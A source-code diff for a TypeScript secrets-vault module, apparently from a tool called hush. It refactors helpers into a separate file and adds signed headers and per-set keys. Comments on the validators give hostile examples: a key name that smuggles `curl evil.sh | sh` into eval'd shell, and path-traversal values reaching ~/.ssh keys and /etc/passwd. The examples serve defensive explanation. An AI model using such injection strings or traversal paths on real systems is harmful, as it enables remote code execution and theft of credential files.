@@ -4,16 +4,25 @@
  * A vault can live in the repo (`.hush/vault.json`, committed) or outside it
  * (`~/.hush/vaults/<name>/vault.json`) with the repo holding a `.hush/link.json`
  * pointer. The second form is how one team vault serves many repos.
+ *
+ * This module is the Vault class; the file's shapes, names and locations are
+ * in vault-files.ts and re-exported from here, so callers import one module.
+ *
+ * **Keys (hush/v3).** Every vault has one vault key, wrapped for each *full*
+ * member, which seals every set that has no key of its own. A set can have a
+ * key of its own — a *restricted* set — so that a *scoped* member (a junior who
+ * gets `dev` but not `prod`, a CI identity that gets `ci`) can read it without
+ * holding the vault key. Full members are wrapped into every restricted set
+ * too, so for them nothing changes. Who holds which key is the header, and in
+ * hush/v3 an admin signs it (header.ts).
  */
-import {
-  existsSync, mkdirSync, readFileSync,
-  openSync, writeSync, fsyncSync, closeSync, renameSync, unlinkSync, statSync, realpathSync,
-} from "node:fs";
-import { dirname, join, resolve, isAbsolute } from "node:path";
-import { randomUUID, createHash } from "node:crypto";
+import { existsSync, mkdirSync, readFileSync, openSync, writeSync, fsyncSync, closeSync, renameSync, unlinkSync } from "node:fs";
+import { dirname } from "node:path";
+import { randomUUID } from "node:crypto";
 import {
   SCHEME,
   SCHEME_V2,
+  SCHEME_V3,
   newDek,
   wrapDek,
   unwrapDek,
@@ -21,218 +30,40 @@ import {
   openValue,
   decodePub,
   encodePub,
+  encodeSpk,
+  decodeSpk,
   fingerprint,
   ValidationError,
-  isValidationError,
   type Opener,
-  type Sealed,
-  type Wrap,
 } from "./crypto.ts";
 import { isAgeRecipient, ageFingerprint, wrapDekWithAge, unwrapDekWithAge } from "./age.ts";
-import { hushHome } from "./identity.ts";
+import { signerFor } from "./identity.ts";
+import { signHeader, verifyHeader, setKeyCommit, vaultKeyCommit } from "./header.ts";
+import {
+  withVaultLock, assertVaultShape, hashOf, jsonErrorSummary, describeOpener, candidatesOf,
+  assertScopeName, assertKeyName, assertValueSize, trimNote, safeText, isAgeWrap,
+  type VaultFile, type Recipient, type SecretEntry, type EnvMeta, type DekWrap,
+} from "./vault-files.ts";
 
-export interface Recipient {
-  name: string;
-  pk: string;
-  role: "admin" | "member";
-  addedAt: string;
-  /** Absent means "x25519", so older vaults load unchanged. */
-  type?: "x25519" | "age";
-}
+export * from "./vault-files.ts";
 
-/** A data key wrapped either natively or by age (possibly via a hardware plugin). */
-export type DekWrap = Wrap | { age: string };
-
-export const isAgeWrap = (w: DekWrap): w is { age: string } => "age" in w;
-
-export interface SecretEntry extends Sealed {
-  /**
-   * Which data-key generation sealed this value. Read by `staleValues()`, and
-   * through it by `hush verify`: after a rotation every value must carry the
-   * new generation, so one left behind means the re-seal did not finish — the
-   * value is still readable only by whoever could read the old key.
-   */
-  gen: number;
-  /**
-   * 2 when this value's AAD binds `gen` (see crypto.ts SCHEME_V2). Absent on
-   * values written by an older hush, whose AAD carried only `env|KEY`.
-   *
-   * Per entry rather than per file so a vault that was upgraded value by value
-   * still opens: the generation is only fed to the AEAD for entries that
-   * actually bound it.
-   */
-  v?: number;
-  updatedAt: string;
-  updatedBy: string;
-  note?: string;
-}
+const SCHEMES = [SCHEME, SCHEME_V2, SCHEME_V3];
 
 /**
- * What an environment is *for*, in the owner's words.
- *
- * Plaintext, beside the ciphertext rather than inside it: none of it is secret,
- * and keeping it out of the sealed payload means renaming or re-describing a set
- * never needs the data key — which for a hardware-backed identity is the
- * difference between editing a label and being asked to touch your YubiKey.
- *
- * Every field is optional. A set with no description is a set with no
- * description, not an error.
- */
-export interface EnvMeta {
-  /** The human spelling. The map key is the slug of it. */
-  label?: string;
-  description?: string;
-  /** "Deploys only", "local dev", "the client's staging box". */
-  whenToUse?: string;
-  createdAt?: string;
-  /** Where it came from, when it was imported from a file. */
-  source?: string;
-}
-
-export interface VaultFile {
-  scheme: string;
-  id: string;
-  name: string;
-  createdAt: string;
-  dek: { generation: number; wraps: Record<string, DekWrap> };
-  recipients: Record<string, Recipient>;
-  envs: Record<string, Record<string, SecretEntry>>;
-  /** Optional, and absent in vaults written before environments had names. */
-  meta?: Record<string, EnvMeta>;
-}
-
-/**
- * A POSIX environment variable name.
- *
- * This is a security boundary, not tidiness. Key names end up in generated
- * shell (`export ${k}=…`, which `hush hook` feeds to `eval`) and in .env
- * files. A member who can write to the vault could otherwise name a key
- * `FOO; curl evil.sh | sh; X` and run commands on every teammate's machine.
- */
-const KEY_NAME = /^[A-Za-z_][A-Za-z0-9_]*$/;
-
-/**
- * One segment of a scope name. The `(?!\.+$)` rules out ".", ".." and "....".
- *
- * Scopes are only object keys today, so a dot segment is harmless — but it costs
- * nothing to refuse now, and it stops a future change that derives a filename
- * from a scope from quietly becoming a path-traversal bug.
- */
-const SCOPE_SEGMENT = /^(?!\.+$)[A-Za-z0-9_.-]+$/;
-
-/**
- * Turn what someone typed into a name the rest of hush can carry.
- *
- * The slug is the real name — `hush run --env acme-production` — so it has to
- * satisfy SCOPE_SEGMENT, and it has to be stable enough that typing the same
- * label twice gives the same answer. The pretty spelling is kept alongside it.
- */
-export function slugifyEnv(label: string): string {
-  const slug = label
-    .normalize("NFKD")
-    .replace(/[\u0300-\u036f]/g, "")
-    .toLowerCase()
-    .replace(/[^a-z0-9]+/g, "-")
-    .replace(/^-+|-+$/g, "")
-    .slice(0, 48);
-  // "..." and "" are both refused by assertScopeName, and neither makes a
-  // useful name, so fall back rather than hand back something that will throw.
-  return /^[a-z0-9]/.test(slug) ? slug : "env-" + createHash("sha256").update(label).digest("hex").slice(0, 8);
-}
-
-export function assertKeyName(key: string): void {
-  if (!KEY_NAME.test(key)) {
-    throw new ValidationError(
-      `"${key.slice(0, 40)}" is not a valid variable name. ` +
-        `Use letters, digits and underscores, starting with a letter or underscore.`,
-    );
-  }
-}
-
-export function assertScopeName(scope: string): void {
-  const segments = scope.split("/");
-  const valid =
-    segments.length >= 1 &&
-    segments.length <= 2 &&
-    segments.every((s) => SCOPE_SEGMENT.test(s));
-  if (!valid) {
-    throw new ValidationError(
-      `"${scope.slice(0, 40)}" is not a valid environment or account name. ` +
-        `Use letters, digits, dot, dash and underscore, optionally as service/account.`,
-    );
-  }
-}
-
-export { ValidationError, isValidationError };
-
-export const isValidKeyName = (k: string): boolean => KEY_NAME.test(k);
-
-/**
- * A generous ceiling on one value. The largest real secret is a private key at
- * a few kilobytes; anything approaching this is a mistake — a whole file pasted
- * into the wrong field — and silently accepting it bloats a vault everyone on
- * the team has to clone.
- */
-const MAX_VALUE_BYTES = 1024 * 1024;
-
-/** Far past any real rotation history; see assertVaultShape. */
-const MAX_GENERATION = 1_000_000;
-
-/** A tag is a label, not a document. */
-const MAX_NOTE_CHARS = 200;
-
-export const trimNote = (note?: string): string | undefined => {
-  const t = (note ?? "").trim();
-  return t ? t.slice(0, MAX_NOTE_CHARS) : undefined;
-};
-
-/**
- * Render a string that came out of the vault file.
- *
- * Everything hush *writes* is validated, but the file arrives over git — from
- * a teammate, or from whoever opened the pull request — and a hand-edited or
- * badly merged one can carry anything at all. Two things go wrong when such a
- * string is printed straight to a terminal:
- *
- *   - Length. A five-megabyte note rendered by `hush ls` took the process out
- *     with a kill signal: a denial of service anyone who can propose a change
- *     could cause.
- *   - Control characters. An ANSI escape sequence in a note or a member name is
- *     interpreted by the terminal rather than shown by it, so it can erase the
- *     lines above and rewrite what the reviewer thinks they are looking at.
- *
- * Notes, member names, environment names and the vault's own name all go
- * through here before they are displayed.
- */
-export function safeText(s: unknown, max = MAX_NOTE_CHARS): string | undefined {
-  if (typeof s !== "string") return undefined;
-  // Strip C0, DEL and C1 — the whole escape-sequence alphabet — but keep every
-  // printable character, because a name is allowed to be in someone's language.
-  const clean = s.replace(/[\u0000-\u001f\u007f-\u009f]/gu, " ").trim();
-  if (!clean) return undefined;
-  return clean.length > max ? clean.slice(0, max) + "\u2026" : clean;
-}
-
-export function assertValueSize(key: string, value: string): void {
-  const bytes = Buffer.byteLength(value, "utf8");
-  if (bytes > MAX_VALUE_BYTES) {
-    throw new ValidationError(
-      `"${key}" is ${Math.round(bytes / 1024)} KB, over the ${MAX_VALUE_BYTES / 1024} KB limit for one secret. ` +
-        `If this is a file rather than a credential, keep it out of the vault.`,
-    );
-  }
-}
-
-/**
- * What a trust check needs to see of a vault: who can open it and the data key
- * behind its current generation. See integrity.ts.
+ * What a trust check needs to see of a vault: who can open it, the data key
+ * behind its current generation — the vault key, or one set's own key — and
+ * the whole document, for the signed header. See integrity.ts.
  */
 export interface TrustView {
   vaultId: string;
   path: string;
+  /** The generation of the key in `dek`: the vault key's, or the set's. */
   generation: number;
   recipients: Record<string, { name: string; pk: string }>;
   dek: Buffer;
+  data: VaultFile;
+  /** Present when `dek` is a restricted set's own key rather than the vault key. */
+  set?: string;
 }
 
 /**
@@ -256,405 +87,45 @@ export function setTrustHook(hook: TrustHook | null): void {
   trustHook = hook;
 }
 
-export interface LinkFile {
-  vault: string;
-  env?: string;
-}
-
-/** .hush/use.json — which account this repo uses for each service. Committable. */
-export type UseFile = Record<string, string>;
-
 /**
- * @deprecated Compatibility read only. usedSets() in src/library.ts reads
- * this to fold each pair into a `service/account` set name, for a project set
- * up before sets were unified. Nothing writes this file any more — there is
- * no (service, account) pin left to save once a set is just a name.
+ * A member's public key, in any of the shapes it arrives in: `hush_pk_` with
+ * 32 bytes (encryption only, as before 1.0), `hush_pk_` with 64 bytes (the
+ * encryption key and the signing key together — what `hush id` prints since
+ * 1.0), or an age recipient.
  */
-export function loadUse(hushDir: string): UseFile {
-  const p = join(hushDir, "use.json");
-  if (!existsSync(p)) return {};
-  try {
-    return JSON.parse(readFileSync(p, "utf8")) as UseFile;
-  } catch {
-    return {};
+export function parseMemberKey(input: string): { type: "x25519" | "age"; pk: string; fp: string; pub?: Buffer; spk?: string } {
+  const t = input.trim();
+  if (isAgeRecipient(t)) return { type: "age", pk: t, fp: ageFingerprint(t) };
+  if (!t.startsWith("hush_pk_")) throw new ValidationError(`not a hush public key or an age recipient: ${t.slice(0, 16)}…`);
+  const raw = Buffer.from(t.slice(8), "base64url");
+  if (raw.length === 64) {
+    const pub = raw.subarray(0, 32);
+    return { type: "x25519", pk: encodePub(pub), fp: fingerprint(pub), pub, spk: encodeSpk(raw.subarray(32)) };
   }
+  const pub = decodePub(t);
+  return { type: "x25519", pk: encodePub(pub), fp: fingerprint(pub), pub };
 }
 
-// ------------------------------------------------------------------ locating
-
-/**
- * Whether a `.hush` directory is hush's own home (`~/.hush`) rather than a
- * project's. They share a name, so from anywhere under $HOME the walk upward
- * reaches it — and once `hush use` or `hush init` had been run from the home
- * folder, every folder beneath it silently became part of that "project".
- */
-export function isHushHome(hushDir: string): boolean {
-  // Real paths, not spellings: macOS's /var is a symlink to /private/var, and
-  // a home folder reached through a link would otherwise slip past this.
-  const real = (p: string): string => {
-    try {
-      return realpathSync(p);
-    } catch {
-      return resolve(p);
-    }
-  };
-  return real(hushDir) === real(hushHome());
-}
-
-/** Refuse to write project files (envs.json, vault.json, policy.json) into ~/.hush. */
-export function assertProjectHushDir(hushDir: string): void {
-  if (isHushHome(hushDir)) {
-    throw new ValidationError(
-      `${hushDir} is where hush keeps your key and library, not a project. ` +
-        "Run this inside a project folder, or use --library for your own sets.",
-    );
-  }
-}
-
-/** Walk up from `start` looking for a `.hush` directory. */
-export function findHushDir(start = process.cwd()): string | null {
-  let dir = resolve(start);
-  for (;;) {
-    const candidate = join(dir, ".hush");
-    if (isHushHome(candidate)) {
-      const parent = dirname(dir);
-      if (parent === dir) return null;
-      dir = parent;
-      continue;
-    }
-    // envs.json alone marks a project that only uses library sets — it gets a
-    // vault of its own the first time it needs one, not before.
-    if (
-      existsSync(join(candidate, "vault.json")) ||
-      existsSync(join(candidate, "link.json")) ||
-      existsSync(join(candidate, "envs.json"))
-    ) {
-      return candidate;
-    }
-    const parent = dirname(dir);
-    if (parent === dir) return null;
-    dir = parent;
-  }
+/** The one string a person hands an admin: encryption and signing key together. */
+export function memberKeyString(id: Opener): string {
+  const signer = signerFor(id);
+  if (id.pub && signer) return "hush_pk_" + Buffer.concat([id.pub, signer.spk]).toString("base64url");
+  return describeOpener(id);
 }
 
 /**
- * A vault name, as it appears under `~/.hush/vaults/<name>/`.
- *
- * One path segment, no traversal. Every caller that turns an outside string
- * into a vault path has to go through this: `path.join` normalises `..`, so a
- * name like "../../escape" is otherwise joined straight out of the vault root
- * and the create path then mkdirs the tree and writes a vault there.
+ * The signing key that goes with one recipient: the key derived from an
+ * X25519 identity, or — for an age (hardware) recipient, which cannot sign —
+ * this machine's stored signing key. An opener can hold both at once, mid-way
+ * through moving to hardware, so the recipient decides which.
  */
-export function assertVaultName(name: string): void {
-  if (!LINK_NAME.test(name)) {
-    throw new ValidationError(
-      `"${name.slice(0, 40)}" is not a vault name. A name is one segment: letters, digits, dot, dash, underscore.`,
-    );
-  }
+function signerOf(id: Opener, r: Recipient, create = false) {
+  if (r.type === "age" || isAgeRecipient(r.pk)) return signerFor({ age: id.age }, create);
+  return id.pub && id.priv ? signerFor({ pub: id.pub, priv: id.priv }) : null;
 }
 
-export const namedVaultPath = (name: string): string => {
-  assertVaultName(name);
-  return join(hushHome(), "vaults", name, "vault.json");
-};
-
-/** Resolve the vault file a given directory is governed by. */
-/**
- * A vault name, as it may appear in a committed `link.json`.
- *
- * One path segment, no traversal. The name is joined onto ~/.hush/vaults, so
- * "../../.ssh/id_ed25519" reaches outside it — and link.json is documented as
- * safe to commit, which means it arrives from whoever wrote the repository.
- */
-const LINK_NAME = /^(?!\.+$)[A-Za-z0-9_.-]+$/;
-
-/**
- * Strip the excerpt V8 puts in a JSON parse error.
- *
- * `Unexpected token 'r', "root:x:0:0:daemon" is not valid JSON` quotes the file
- * it failed on. For a vault that is your own file and harmless; for a path named
- * by someone else's link.json it is an arbitrary-file read whose first bytes get
- * printed. The position is the useful half and it survives.
- */
-const jsonErrorSummary = (e: unknown): string =>
-  String((e as Error)?.message ?? e)
-    .replace(/"[\s\S]*?"\.{0,3}/g, "…")
-    .slice(0, 120);
-
-/**
- * The vault a link points at must be a regular file.
- *
- * Not a directory, and above all not a device or a fifo: `{"vault":"/dev/zero"}`
- * in a cloned repo would otherwise make every hush command read for ever.
- */
-function assertReadableVaultFile(path: string, why: string): void {
-  let stat;
-  try {
-    stat = statSync(path);
-  } catch {
-    throw new Error(`No vault at ${path}.\n  ${why}`);
-  }
-  if (!stat.isFile()) {
-    throw new Error(`${path} is not a vault file.\n  ${why}`);
-  }
-}
-
-/**
- * Where the project is and whether it has a vault yet. A folder whose .hush/
- * holds only envs.json is a project — it uses library sets — but `vaultPath`
- * points at a file that does not exist, and a caller that needs one has to
- * say so rather than let Vault.open() fail with a path error.
- */
-export function locateProject(
-  start = process.cwd(),
-): { vaultPath: string; hushDir: string; hasVault: boolean; env?: string } | null {
-  const loc = resolveVaultPath(start);
-  return loc && { ...loc, hasVault: existsSync(loc.vaultPath) };
-}
-
-export function resolveVaultPath(start = process.cwd()): { vaultPath: string; hushDir: string; env?: string } | null {
-  if (process.env.HUSH_VAULT) {
-    const p = resolve(process.env.HUSH_VAULT);
-    return { vaultPath: p, hushDir: dirname(p), env: process.env.HUSH_ENV };
-  }
-  const hushDir = findHushDir(start);
-  if (!hushDir) return null;
-
-  const linkPath = join(hushDir, "link.json");
-  if (existsSync(linkPath)) {
-    let link: LinkFile;
-    try {
-      link = JSON.parse(readFileSync(linkPath, "utf8")) as LinkFile;
-    } catch (e) {
-      throw new Error(
-        `${linkPath} is not valid JSON (${jsonErrorSummary(e)}).\n` +
-          `  It should look like:  { "vault": "personal", "env": "default" }`,
-      );
-    }
-    // Without this check a missing field surfaced as an internal path error.
-    if (typeof link?.vault !== "string" || link.vault.trim() === "") {
-      throw new Error(
-        `${linkPath} does not name a vault.\n` +
-          `  It should look like:  { "vault": "personal", "env": "default" }\n` +
-          `  Or re-create it with:  hush link <vault-name>`,
-      );
-    }
-
-    const named = link.vault.trim();
-    let target: string;
-    if (isAbsolute(named)) {
-      target = named;
-      // An absolute path in a committed link.json is not portable anyway — it
-      // cannot exist on a teammate's machine — so it is either yours or it is
-      // someone else's idea of where you should look. Never silent.
-      if (!resolve(target).startsWith(resolve(hushHome()) + "/")) {
-        process.stderr.write(
-          `hush: ${linkPath} points outside ~/.hush — reading ${target}\n`,
-        );
-      }
-    } else {
-      if (!LINK_NAME.test(named)) {
-        throw new Error(
-          `${linkPath} names "${named.slice(0, 40)}", which is not a vault name.\n` +
-            `  A name is one segment: letters, digits, dot, dash, underscore.\n` +
-            `  If this file came from a repository you cloned, do not trust it.`,
-        );
-      }
-      target = namedVaultPath(named);
-    }
-    assertReadableVaultFile(target, `Named by ${linkPath}. Re-create it with: hush link <vault-name>`);
-    return { vaultPath: target, hushDir, env: process.env.HUSH_ENV || link.env };
-  }
-  return { vaultPath: join(hushDir, "vault.json"), hushDir, env: process.env.HUSH_ENV };
-}
-
-/**
- * Every identity slot this opener could match.
- *
- * `includeAge` exists because reading an age identity can mean talking to a
- * YubiKey. Resolving it when the vault has no age recipients at all would make
- * the hardware prompt on `hush ls`, for nothing.
- */
-function candidatesOf(
-  id: Opener,
-  includeAge = true,
-): { fp: string; kind: "x25519" | "age"; recipient?: string }[] {
-  const out: { fp: string; kind: "x25519" | "age"; recipient?: string }[] = [];
-  if (id.pub) out.push({ fp: fingerprint(id.pub), kind: "x25519" });
-  if (includeAge) {
-    for (const r of id.age?.recipients ?? []) {
-      out.push({ fp: ageFingerprint(r), kind: "age", recipient: r });
-    }
-  }
-  return out;
-}
-
-/** How to name this opener in an error message. */
-function describeOpener(id: Opener): string {
-  if (id.pub) return encodePub(id.pub);
-  const first = id.age?.recipients[0];
-  return first ?? "(no identity)";
-}
-
-// --------------------------------------------------------------------- lock
-
-const sleepSync = (ms: number): void => {
-  Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, ms);
-};
-
-const hashOf = (s: string | Buffer): string =>
-  createHash("sha256").update(s).digest("hex");
-
-/**
- * Hold an exclusive lock for the duration of a read-modify-write.
- *
- * Without this, two `hush set` commands each read the vault, each add their own
- * key, and the second write silently discards the first. Running eight at once
- * left one survivor.
- */
-/** A lock untouched for this long is assumed to belong to a dead process. */
-const STALE_LOCK_MS = 30_000;
-
-/** Tunable for CI and for tests that need to observe the wait, not sit through it. */
-const lockTimeoutMs = (): number => Number(process.env.HUSH_LOCK_TIMEOUT_MS) || 15_000;
-
-function withVaultLock<T>(vaultPath: string, fn: () => T, timeoutMs = lockTimeoutMs()): T {
-  const lockPath = `${vaultPath}.lock`;
-  const deadline = Date.now() + timeoutMs;
-  let fd: number | undefined;
-
-  for (;;) {
-    try {
-      fd = openSync(lockPath, "wx");
-      break;
-    } catch (e) {
-      if ((e as NodeJS.ErrnoException).code !== "EEXIST") throw e;
-
-      // A process that died mid-write would otherwise wedge the vault forever,
-      // so a lock that has not been touched for a while is reclaimable.
-      //
-      // Staleness is judged by mtime, never by the file's contents. open(…,"wx")
-      // creates the file EMPTY and fills it a moment later; a reader landing in
-      // that window sees "", fails to parse it, and — on the old "unreadable
-      // means stale" rule — deleted a lock that was very much alive. Two writers
-      // then held it at once and one's write was silently lost, while still
-      // reporting success.
-      let age: number;
-      try {
-        age = Date.now() - statSync(lockPath).mtimeMs;
-      } catch {
-        continue; // the lock vanished; race for it again
-      }
-      if (age > STALE_LOCK_MS) {
-        try {
-          // Only reclaim if nobody refreshed it since we looked.
-          if (Date.now() - statSync(lockPath).mtimeMs > STALE_LOCK_MS) unlinkSync(lockPath);
-        } catch { /* someone else got there first */ }
-        continue;
-      }
-      if (Date.now() > deadline) {
-        throw new Error(
-          `Timed out waiting for the vault lock (${lockPath}). If no other hush is running, delete it.`,
-        );
-      }
-      sleepSync(40);
-    }
-  }
-
-  try {
-    writeSync(fd, JSON.stringify({ pid: process.pid, at: Date.now() }));
-    closeSync(fd);
-    fd = undefined;
-    return fn();
-  } finally {
-    if (fd !== undefined) {
-      try { closeSync(fd); } catch { /* already closed */ }
-    }
-    try { unlinkSync(lockPath); } catch { /* best effort */ }
-  }
-}
-
-// -------------------------------------------------------------------- vault
-
-/**
- * Check the shape of a vault file before anything trusts it.
- *
- * `open()` used to verify only the scheme string, so every other field was taken
- * on faith from a file that arrives over git. That mattered most for the numbers:
- * a vault with `"generation": "lots"` decrypted perfectly while silently
- * disabling rollback detection, because `"lots" < 4` is false and so is
- * `"lots" > 4` — the comparison that is supposed to shout simply stopped
- * shouting. Same for a negative generation, and for a `gen` that is not a number.
- *
- * This is deliberately a shape check, not a schema: unknown extra fields are
- * fine, so a vault written by a newer hush still loads here.
- */
-function assertVaultShape(data: VaultFile, path: string): void {
-  const bad = (why: string): never => {
-    throw new Error(
-      `The vault at ${path} is malformed: ${why}.\n` +
-        `  A vault is not merged line by line. After a git merge: hush merge (it merges key by key).`,
-    );
-  };
-  const isObject = (x: unknown): x is Record<string, unknown> =>
-    typeof x === "object" && x !== null && !Array.isArray(x);
-  // Bounded above as well as below. A vault claiming generation 2^53 decrypts
-  // perfectly and poisons the rollback watermark for good: every genuine vault
-  // afterwards reads as "rolled back", so the warning that is supposed to mean
-  // something fires constantly and `hush verify` never passes again. A million
-  // rotations is far beyond anything real — a daily rotation for 2700 years.
-  const isGeneration = (x: unknown): x is number =>
-    typeof x === "number" && Number.isSafeInteger(x) && x >= 1 && x <= MAX_GENERATION;
-
-  if (!isObject(data.dek)) bad("it has no data key");
-  if (!isGeneration(data.dek.generation)) {
-    bad(`the key generation is ${JSON.stringify(data.dek.generation)} rather than a positive whole number`);
-  }
-  if (!isObject(data.dek.wraps)) bad("the data key has no wraps");
-  if (!isObject(data.recipients)) bad("the member list is not an object");
-  if (!isObject(data.envs)) bad("the environments are not an object");
-
-  for (const [fp, r] of Object.entries(data.recipients)) {
-    if (!isObject(r) || typeof r.pk !== "string" || typeof r.name !== "string") {
-      bad(`member "${fp.slice(0, 12)}" is missing a name or a public key`);
-    }
-    // Checked on load rather than at the next rotation. Without this, a vault
-    // carrying `"pk": "../../../etc/passwd"` opens and lists fine, and only
-    // falls over later inside `hush team rm` — in the middle of a revocation,
-    // which is the worst moment to discover the file was malformed all along.
-    const pk = r.pk as string;
-    if (!isAgeRecipient(pk)) {
-      try {
-        decodePub(pk);
-      } catch {
-        bad(`member "${(r.name as string).slice(0, 24)}" has a public key that is neither a hush key nor an age recipient`);
-      }
-    }
-  }
-  if (data.meta !== undefined) {
-    if (!isObject(data.meta)) bad("the environment descriptions are not an object");
-    for (const [env, m] of Object.entries(data.meta)) {
-      if (!isObject(m)) bad(`the description of "${env.slice(0, 40)}" is not an object`);
-    }
-  }
-  for (const [env, values] of Object.entries(data.envs)) {
-    if (!isObject(values)) bad(`environment "${env.slice(0, 40)}" is not an object`);
-    for (const [key, e] of Object.entries(values)) {
-      if (!isObject(e) || typeof e.iv !== "string" || typeof e.ct !== "string" || typeof e.tag !== "string") {
-        bad(`"${env.slice(0, 20)}/${key.slice(0, 40)}" is not a sealed value`);
-      }
-      // A non-numeric generation here would defeat the re-seal check the same
-      // way a non-numeric one on the data key defeats rollback detection.
-      if (!isGeneration((e as unknown as SecretEntry).gen)) {
-        bad(`"${env.slice(0, 20)}/${key.slice(0, 40)}" records generation ${JSON.stringify((e as unknown as SecretEntry).gen)}`);
-      }
-      const aadVersion = (e as unknown as SecretEntry).v;
-      if (aadVersion !== undefined && (!Number.isSafeInteger(aadVersion) || aadVersion < 2)) {
-        bad(`"${env.slice(0, 20)}/${key.slice(0, 40)}" records an unknown AAD version ${JSON.stringify(aadVersion)}`);
-      }
-    }
-  }
-}
+const wrapFor = (key: Buffer, r: Recipient): DekWrap =>
+  r.type === "age" || isAgeRecipient(r.pk) ? { age: wrapDekWithAge(key, r.pk) } : wrapDek(key, decodePub(r.pk));
 
 export class Vault {
   readonly path: string;
@@ -665,6 +136,7 @@ export class Vault {
    * that makes revocation meaningless inside a long-lived process.
    */
   private dekCache: { fp: string; dek: Buffer } | null = null;
+  private setKeyCache = new Map<string, { fp: string; key: Buffer }>();
 
   /** Hash of the bytes this instance was read from, to detect a concurrent write. */
   private baseline: string | null = null;
@@ -677,7 +149,7 @@ export class Vault {
   )[] = [];
   /** Set by membership or key-rotation changes, which are not safely replayable. */
   private structural = false;
-  /** Remembered so a replay can re-seal under the newer data key. */
+  /** Remembered so a replay can re-seal under the newer data key, and a save can sign. */
   private opener: Opener | null = null;
   /**
    * A data key this instance knows is legitimate for `data.dek.generation`:
@@ -685,10 +157,15 @@ export class Vault {
    * since a vault this machine just wrote is by definition one it accepts.
    */
   private trusted: { generation: number; dek: Buffer } | null = null;
+  /** The same, per restricted set. */
+  private trustedSets = new Map<string, { generation: number; key: Buffer }>();
 
   /** True when at least one member uses age, so hardware is worth waking. */
   private get usesAge(): boolean {
-    return Object.values(this.data.dek.wraps).some(isAgeWrap);
+    return (
+      Object.values(this.data.dek.wraps).some(isAgeWrap) ||
+      Object.values(this.data.setKeys ?? {}).some((k) => Object.values(k.wraps).some(isAgeWrap))
+    );
   }
 
   private myCandidates(id: Opener) {
@@ -700,11 +177,18 @@ export class Vault {
     this.data = data;
   }
 
-  /** The founding member is either an X25519 key or an age recipient. */
+  /**
+   * The founding member is either an X25519 key or an age recipient.
+   *
+   * An X25519 founder gets a signed hush/v3 vault from the start. An age-only
+   * founder (a hardware key) gets v2 until `hush team sign`: signing needs a
+   * key the hardware cannot provide, and making one is not something a library
+   * call should do behind anyone's back.
+   */
   static create(
     path: string,
     name: string,
-    owner: { name: string; pub?: Buffer; ageRecipient?: string },
+    owner: { name: string; pub?: Buffer; ageRecipient?: string; priv?: Buffer },
   ): Vault {
     const dek = newDek();
     const now = new Date().toISOString();
@@ -713,7 +197,7 @@ export class Vault {
     let wrap: DekWrap;
     let recipient: Recipient;
 
-    if (owner.ageRecipient) {
+    if (owner.ageRecipient && !owner.pub) {
       const r = owner.ageRecipient.trim();
       fp = ageFingerprint(r);
       wrap = { age: wrapDekWithAge(dek, r) };
@@ -726,18 +210,25 @@ export class Vault {
       throw new Error("A vault needs a founding member: pass either pub or ageRecipient.");
     }
 
+    const id = `vlt_${randomUUID().replace(/-/g, "").slice(0, 16)}`;
     const data: VaultFile = {
       scheme: SCHEME_V2,
-      id: `vlt_${randomUUID().replace(/-/g, "").slice(0, 16)}`,
+      id,
       name,
       createdAt: now,
-      dek: { generation: 1, wraps: { [fp]: wrap } },
+      dek: { generation: 1, wraps: { [fp]: wrap }, commit: vaultKeyCommit(dek, id, 1) },
       recipients: { [fp]: recipient },
       envs: { default: {} },
     };
     const v = new Vault(path, data);
     v.dekCache = { fp, dek };
     v.trusted = { generation: 1, dek };
+    // Signed from birth when the founder can sign: the whole point of v3 is
+    // that there is never an unsigned moment for someone to slip into.
+    if (owner.pub && owner.priv) {
+      v.opener = { pub: owner.pub, priv: owner.priv };
+      v.upgradeToV3(v.opener);
+    }
     v.save();
     return v;
   }
@@ -747,7 +238,7 @@ export class Vault {
    * checked exactly as a file would be. Never saved unless the caller does.
    */
   static fromData(path: string, data: VaultFile): Vault {
-    if (data?.scheme !== SCHEME && data?.scheme !== SCHEME_V2) {
+    if (!SCHEMES.includes(data?.scheme)) {
       throw new Error(`Unsupported vault scheme ${data?.scheme ?? "(none)"} in ${path}.`);
     }
     assertVaultShape(data, path);
@@ -775,9 +266,9 @@ export class Vault {
       );
     }
 
-    if (data?.scheme !== SCHEME && data?.scheme !== SCHEME_V2) {
+    if (!SCHEMES.includes(data?.scheme)) {
       throw new Error(
-        `Unsupported vault scheme ${data?.scheme ?? "(none)"} (this build speaks ${SCHEME} and ${SCHEME_V2}).\n` +
+        `Unsupported vault scheme ${data?.scheme ?? "(none)"} (this build speaks ${SCHEMES.join(", ")}).\n` +
           `  Upgrade hush, or check that ${path} really is a vault file.`,
       );
     }
@@ -785,6 +276,11 @@ export class Vault {
     const v = new Vault(path, data);
     v.baseline = hashOf(raw);
     return v;
+  }
+
+  /** hush/v3: the header is signed by an admin. */
+  get signed(): boolean {
+    return this.data.scheme === SCHEME_V3;
   }
 
   /**
@@ -800,33 +296,80 @@ export class Vault {
     withVaultLock(this.path, () => this.saveLocked());
     // What this machine just wrote is what it accepts: a member it added, a
     // rotation it made. Only when the key in hand belongs to the generation on
-    // disk — a save that never touched the data key pins nothing.
-    if (trustHook && this.trusted && this.trusted.generation === this.data.dek.generation) {
+    // disk — a save that never touched a data key pins nothing.
+    if (!trustHook) return;
+    if (this.trusted && this.trusted.generation === this.data.dek.generation) {
       trustHook.record(this.trustView(this.trusted.dek));
+    }
+    for (const [env, t] of this.trustedSets) {
+      if (this.data.setKeys?.[env]?.generation === t.generation) trustHook.record(this.trustView(t.key, env));
     }
   }
 
   /** The shape the trust check reads. See integrity.ts. */
-  trustView(dek: Buffer): TrustView {
+  trustView(dek: Buffer, set?: string): TrustView {
     const recipients: TrustView["recipients"] = {};
     for (const [fp, r] of Object.entries(this.data.recipients)) recipients[fp] = { name: r.name, pk: r.pk };
-    return { vaultId: this.data.id, path: this.path, generation: this.data.dek.generation, recipients, dek };
+    const generation = set ? this.data.setKeys![set].generation : this.data.dek.generation;
+    return { vaultId: this.data.id, path: this.path, generation, recipients, dek, data: this.data, ...(set ? { set } : {}) };
   }
 
   /**
-   * The data key *without* the trust check, for showing a person what changed
-   * (`hush team accept`, `hush verify`). Never used to open or seal a value:
-   * that is exactly what the check exists to stop.
+   * The key this identity can review the vault with *without* the trust check,
+   * for showing a person what changed (`hush team accept`, `hush verify`): the
+   * vault key for a full member, otherwise one of their sets' keys. Never used
+   * to open or seal a value: that is exactly what the check exists to stop.
    */
-  dekForReview(id: Opener): Buffer {
+  reviewView(id: Opener): TrustView {
     for (const c of this.myCandidates(id)) {
